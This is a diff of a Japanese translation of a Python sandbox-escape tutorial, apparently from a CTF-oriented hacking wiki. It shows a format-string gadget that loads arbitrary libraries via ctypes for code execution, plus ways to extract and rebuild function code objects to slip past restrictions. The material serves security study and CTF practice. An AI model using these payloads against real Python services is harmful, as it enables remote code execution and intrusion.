-According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/)、python の format string vulnerability を悪用してディスクから任意のライブラリを読み込むことが可能です。
+[**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) によると、format string vulnerability in python を悪用してディスクから任意のライブラリを読み込むことが可能です。
 
-念のため、python で何かアクションが実行されるたびにある関数が呼ばれます。例えば `2*3` は **`(2).mul(3)`** を実行し、`{'a':'b'}['a']` は **`{'a':'b'}.__getitem__('a')`** を実行します。
+念のため、python で何か操作が行われるたびにいくつかの関数が実行されます。例えば `2*3` は **`(2).mul(3)`** を実行し、**`{'a':'b'}['a']`** は **`{'a':'b'}.__getitem__('a')`** を実行します。
 
-このような例はセクション [**Python execution without calls**](#python-execution-without-calls) にもっとあります。
+同様の例はセクション [**Python execution without calls**](#python-execution-without-calls) にもっとあります。
 
-python の format string vuln は関数の実行を許さない（括弧を使えないため）、したがって `'{0.system("/bin/sh")}'.format(os)` のような RCE は不可能です。\
-しかし `[]` は使えます。したがって、一般的な python ライブラリが任意コードを実行する **`__getitem__`** または **`__getattr__`** メソッドを持っていれば、それらを悪用して RCE を得ることが可能です。
+python format string vuln では関数を実行できません（括弧が使えないため）、したがって `'{0.system("/bin/sh")}'.format(os)` のようなRCEは不可能です。\
+しかし、`[]` を使うことは可能です。したがって、一般的なpythonライブラリに任意のコードを実行する **`__getitem__`** や **`__getattr__`** メソッドがあれば、それらを悪用してRCEを得ることができます。
 
-そのような gadget を python 内で探すために、writeup ではこの [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) を提案しています。そこで彼が見つけたのがこの [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+pythonでそのようなgadgetを探すために、writeupはこの [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) を提案しています。そこで彼がこの [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463) を見つけました：
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -772,20 +778,20 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-このガジェットは **load a library from disk** を可能にします。したがって、攻撃対象のサーバーに、正しくコンパイルされたライブラリを何らかの方法で **write or upload the library to load** しておく必要があります。
+この gadget はディスクから**library をロード**することができます。したがって、攻撃対象のサーバー向けに正しくコンパイルされた状態の **library を何らかの方法で書き込むかアップロードする**必要があります。
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-このチャレンジは実際にサーバの別の脆弱性を悪用しており、サーバのディスク上に任意のファイルを作成できるようにしています。
+このチャレンジは実際、サーバー上の別の脆弱性を悪用しており、サーバーのディスク上に任意のファイルを作成できるようになっています。
 
-## Python オブジェクトの解析
+## Pythonオブジェクトの解析
 
 > [!TIP]
-> もし **python bytecode** について深く**学びたい**なら、このトピックに関する**素晴らしい**投稿を読んでください: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> もし **python bytecode** を深く**学びたい**なら、この**素晴らしい**記事を読んでください: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-一部のCTFでは、**custom function where the flag** の名前が与えられ、その**function**の**internals**を確認してそれを抽出する必要があります。
+一部の CTFs では、flag が存在する **カスタム関数** の名前が提供され、その **内部** を確認して **関数** を解析する必要があることがあります。
 
-以下が解析対象の関数です:
+これが解析する関数です:
 ```python
 def get_flag(some_input):
 var1=1
@@ -805,7 +811,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` and `func_globals`（同じ） はグローバル環境を取得します。例では、いくつかのインポートされたモジュールや、いくつかのグローバル変数とその内容が宣言されているのが見えます:
+`__globals__` and `func_globals`(同じ) はグローバル環境を取得します。例では、いくつかのインポート済みモジュール、いくつかのグローバル変数とそれらの内容が宣言されているのが確認できます:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -816,9 +822,9 @@ CustomClassObject.__class__.__init__.__globals__
 ```
 [**See here more places to obtain globals**](#globals-and-locals)
 
-### **関数コードへのアクセス**
+### **関数のコードへのアクセス**
 
-**`__code__`** と `func_code`: 関数のこの**属性**に**アクセス**することで、関数の**code object**を**取得**できます。
+**`__code__`** と `func_code`: 関数のこの**属性**に**アクセス**して、関数の**code object**を**取得**できます。
 ```python
 # In our current example
 get_flag.__code__
@@ -906,7 +912,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-注意: **もし python sandbox 上で `dis` を import できない場合**、関数の**bytecode**（`get_flag.func_code.co_code`）を取得してローカルで**disassemble**できます。`LOAD_CONST`でロードされる変数の内容は見えませんが、`get_flag.func_code.co_consts`から推測できます。`LOAD_CONST`はロードされる変数のオフセットも示すからです。
+注意: **if you cannot import `dis` in the python sandbox**、関数の**bytecode**（`get_flag.func_code.co_code`）を取得してローカルで**disassemble**できます。`LOAD_CONST`で読み込まれる変数の内容は表示されませんが、`get_flag.func_code.co_consts`から推測できます。`LOAD_CONST`は読み込まれる変数のオフセットも示すためです。
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -930,8 +936,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Pythonのコンパイル
 
-ここで、何らかの方法で**実行できない関数の情報をdumpできる**が、それを**実行**することが**必要**だと想像してみてください。\
-次の例のように、その関数の**code objectにアクセスできる**が、disassembleを読むだけでは`calc_flag`のようなより複雑な関数の場合、flagをどう計算するか**分からない**。(_より複雑な`calc_flag`関数を想像してみてください_)
+ここで、何らかの方法で**実行できない関数の情報をdumpできる**が、どうしてもそれを**実行**する必要があると想像してみてください。\
+次の例のように、その関数の**code objectにアクセスできる**が、disassembleを読むだけでは**flagをどう計算するか分からない** (_より複雑な`calc_flag`関数を想像してください_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -944,9 +950,9 @@ return calc_flag("VjkuKuVjgHnci")
 else:
 return "Nope"
 ```
-### コードオブジェクトの作成
+### code object の作成
 
-まず、**コードオブジェクトを作成および実行する方法**を理解する必要があります。そうすれば、我々の関数 leaked を実行するためのコードオブジェクトを作成できます:
+まず、我々の leaked function を実行するための code object を作成できるよう、**code object をどのように作成および実行するか**を知る必要があります:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -966,7 +972,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 > [!TIP]
-> pythonのバージョンによって、`code_type` の**パラメータ**の**順序**が異なる場合があります。実行中のpythonバージョンでのパラメータの順序を確認する最も確実な方法は、次を実行することです：
+> Pythonのバージョンによっては、`code_type`の**パラメータ**は**異なる順序**になっている場合があります。実行中のPythonバージョンでのパラメータの順序を確認する最も確実な方法は、次を実行することです:
 >
 > ```
 > import types
@@ -974,10 +980,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Recreating a leaked function
+### leakされた関数を再作成する
 
 > [!WARNING]
-> 以下の例では、function code object から関数を再作成するために必要なすべてのデータを直接取得します。**real example** では、関数 **`code_type`** を実行するためのすべての **値** が、あなたが**leak**する必要があるものになります。
+> 以下の例では、関数のコードオブジェクトから直接関数を再作成するために必要なすべてのデータを取得します。**実際の例**では、関数 **`code_type`** を実行するためのすべての **値** は **あなたが leak する必要がある** ものです。
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -988,12 +994,12 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### 防御の回避
+### 防御を回避
 
-この投稿の冒頭の例では、`compile`関数を使って任意のpythonコードを実行する方法が示されています。これは、ループなどを含むスクリプト全体を**ワンライナーで実行できる**点で興味深いです（`exec`を使って同じこともできます）。\
-とはいえ、ローカルマシンで**compiledオブジェクトを作成**し、**CTFマシンで実行**することが役立つ場合があります（例えば、CTFに`compiled`関数がない場合など）。
+この投稿の冒頭の例では、`compile`関数を使って**任意のpythonコードを実行する方法**が確認できます。これは、ループ等を含む**スクリプト全体を**を**one liner**で実行できるという点で興味深いです（**`exec`**を使って同じこともできます）。\
+とはいえ、ローカルマシンで**コンパイル済みオブジェクト**を**作成**し、それを**CTF machine**で実行することが有用な場合があります（例えばCTF側に`compiled`関数がないため）。
 
-例えば、_./poc.py_ を読み込む関数を手動でcompileして実行してみましょう:
+例えば、_./poc.py_を読み取る関数を手動でコンパイルして実行してみましょう:
 ```python
 #Locally
 def read():
@@ -1020,7 +1026,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-もし `eval` や `exec` にアクセスできない場合、**適切な関数** を作成することは可能ですが、直接呼び出すと通常次のように失敗します: _constructor not accessible in restricted mode_。したがって、この関数を呼び出すために **制限された環境に属さない関数** が必要です。
+もし `eval` や `exec` にアクセスできない場合、**適切な関数**を作成することはできますが、それを直接呼び出すと通常 _コンストラクタは制限モードでアクセスできません_ と失敗します。したがって、**この関数を呼び出すために制限された環境の外にある関数** が必要です。
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1028,11 +1034,11 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## コンパイル済み Python の Decompiling
+## Decompiling Compiled Python
 
-[**https://www.decompiler.com/**](https://www.decompiler.com) のようなツールを使用すると、与えられたコンパイル済み Python コードを **decompile** できます。
+[**https://www.decompiler.com/**](https://www.decompiler.com) のようなツールを使うと、与えられたコンパイル済み python コードを **decompile** できます。
 
-**このチュートリアルを参照してください**:
+**このチュートリアルを参照してください**：
 
 
 {{#ref}}
@@ -1043,7 +1049,7 @@ f(42)
 
 ### Assert
 
-`-O` パラメータで最適化モードで実行された Python は、assert 文や **debug** の値に依存する条件付きコードを削除します。\
+`-O` パラメータで最適化を有効にして実行した Python は、asset statements と **debug** の値に依存するコードを削除します。\\
 したがって、次のようなチェックは
 ```python
 def check_permission(super_user):
